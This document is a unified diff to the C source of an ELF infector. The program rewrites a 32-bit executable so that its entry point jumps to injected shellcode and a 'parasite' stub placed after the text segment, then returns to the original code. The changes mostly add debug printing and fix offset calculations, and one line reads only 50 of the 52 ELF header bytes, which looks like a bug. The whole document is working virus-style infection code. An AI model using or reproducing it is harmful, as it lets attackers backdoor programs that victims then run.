@@ -58,24 +58,31 @@ int main(int argc, char * argv[]){
 	section_headers = get_elf_section_headers(fp, elf_header);
 
 	//In ELF header, increase e_shoff by PAGE_SIZE 
+  printf("header e_shoff changed from %x to ",elf_header->e_shoff);
 	elf_header->e_shoff = elf_header->e_shoff + PAGE_SIZE;
+  printf("%x\n",elf_header->e_shoff);
 		
 	//patch code to be inserted to jump to original entry point
 	//from the elf header.		
 	parasite = get_parasite();
+  printf("writing entry point %x to parasite.\n",elf_header->e_entry);
 	memcpy(&parasite[32],&elf_header->e_entry, 4);	
 	
 	//Locate the text segment program header	
+  int flag_x = 4;
 	for(int i=0; i < elf_header->e_phnum; i++){
-		if(program_headers[i]->p_type == 1){
+		if(program_headers[i]->p_type == 1 && program_headers[i]->p_flags & flag_x != 0){
+      printf("using text segment at index %d.\n",i);
 			text_segment_index = i;
 			break;
 		}
 	}
 
 	//Modify e_entry, in the elf header, to point to new code.
+  printf("elf header entry point changed from %x to ",elf_header->e_entry);
 	new_code_address = program_headers[text_segment_index]->p_vaddr + program_headers[text_segment_index]->p_filesz;	
 	elf_header->e_entry = new_code_address;
+  printf("%x.\n",elf_header->e_entry);
 	
 	//get the shellcode we want to insert into memory.
 	shellcode = get_shellcode(argv);
@@ -85,19 +92,27 @@ int main(int argc, char * argv[]){
 	int offset=program_headers[text_segment_index]->p_offset+program_headers[text_segment_index]->p_filesz;
 
 	//increase p_filesz to account for new code
+  printf("program header filesz changed from %x to ",program_headers[text_segment_index]->p_filesz);
 	unsigned int new_p_filesz = program_headers[text_segment_index]->p_filesz+shellcode->size+PARASITE_SIZE;
 	program_headers[text_segment_index]->p_filesz = new_p_filesz;
+  printf("%x.\n",program_headers[text_segment_index]->p_filesz);
 	
 	//increase p_memsz to account for new code
+  printf("program header memsz changed from %x to ",program_headers[text_segment_index]->p_memsz);
 	unsigned int new_p_memsz = program_headers[text_segment_index]->p_memsz+shellcode->size+PARASITE_SIZE;
 	program_headers[text_segment_index]->p_memsz = new_p_memsz;
-	
+	printf("%x.\n",program_headers[text_segment_index]->p_memsz);
+
 	//For each phdr who's segment is after the insertion -- increase p_offset
 	//by PAGE_SIZE ???
 	
-	printf("The offset is %x\n", offset);
+	printf("The offset is 0x%x (%d)\n", offset,offset);
 	for(int i=(text_segment_index+1); i<elf_header->e_phnum; i++){
-		program_headers[i]->p_offset += PAGE_SIZE;
+    if(program_headers[i]->p_offset > offset){
+      printf("program_header[%d] offset changed from %x to ",i,program_headers[i]->p_offset);
+		  program_headers[i]->p_offset += PAGE_SIZE;
+      printf("%x.\n",program_headers[i]->p_offset);
+    }
 	}
 	
 	//debug code
@@ -110,9 +125,14 @@ int main(int argc, char * argv[]){
 	//For each pphdr who's segment is after the insertion -- increase p_offset
 	//by PAGE_SIZE ???
 	for(int i=0;i<elf_header->e_shnum; i++){
-		if(section_headers[i]->sh_offset >= offset){
+		if(section_headers[i]->sh_offset > offset){
+      printf("section header[%d] changed from %x to ",i,section_headers[i]->sh_offset);
 			section_headers[i]->sh_offset += PAGE_SIZE;
+      printf("%x.\n",section_headers[i]->sh_offset);
 		}
+    else{
+        printf("ignoring section header[%d]. sh_offset=%d(0x%x).\n",i,section_headers[i]->sh_offset,section_headers[i]->sh_offset);
+    }
 	}
 	
 	//debug code
@@ -135,7 +155,8 @@ int main(int argc, char * argv[]){
 	
 	//write the program headers
 	for(int i=0; i<elf_header->e_phnum; i++){
-		fwrite(program_headers[i],1,elf_header->e_phentsize,infected);
+    printf("writing program header[%d] (size %d). \n",i,elf_header->e_phentsize);
+		fwrite(program_headers[i],elf_header->e_phentsize,1,infected);
 	}
 	//copy everything up to where we insert the shellcode	
 	int position;
@@ -150,11 +171,12 @@ int main(int argc, char * argv[]){
 	lseek(infected_descriptor, position=elf_header->e_ehsize+(elf_header->e_phentsize*elf_header->e_phnum), SEEK_SET);
 	lseek(fd, position=elf_header->e_ehsize+(elf_header->e_phentsize*elf_header->e_phnum), SEEK_SET);
 	
-
-	//printf("offset is:%d\n",offset);
-	//printf("position is %d\n",position);
-	//printf("offset-position is:%x\n",offset-position);
-	copy_partial(fd, infected_descriptor, offset-position);
+  printf("copying headers to new file...\n");
+	printf("-- offset is:%d\n",offset);
+	printf("-- position is %d\n",position);
+	printf("-- offset-position is:%d (0x%x)\n",offset-position,offset-position);
+  printf("-- prog_header[]->p_offset + offset - position is: %d\n",(program_headers[text_segment_index]->p_offset + offset) - position);
+	copy_partial(fd, infected_descriptor, (program_headers[text_segment_index]->p_offset + offset)-position);
 	
 	//insert the shellcode
 	write(infected_descriptor,parasite,PARASITE_SIZE);
@@ -164,7 +186,7 @@ int main(int argc, char * argv[]){
 	int garbage_size = PAGE_SIZE-(shellcode->size + PARASITE_SIZE);
 	char * garbage = (char *) malloc(garbage_size);
 	
-	printf("The garbage size is %d",garbage_size);
+	printf("The garbage size is %d\n",garbage_size);
 
 	//Use garbage character 0x42 because life the universe and everything.
 	for(int i=0;i<garbage_size;i++){
@@ -218,7 +240,7 @@ Elf32_Ehdr * get_elf_header(FILE * fp){
 	Elf32_Ehdr * elf = (Elf32_Ehdr *) malloc(sizeof(Elf32_Ehdr));
 	
 	//read in the entire header at once.
-	if(fread(elf,1,52,fp) == 0)
+	if(fread(elf,1,50,fp) == 0)
 		goto elf_header_error;
 	return elf;
 
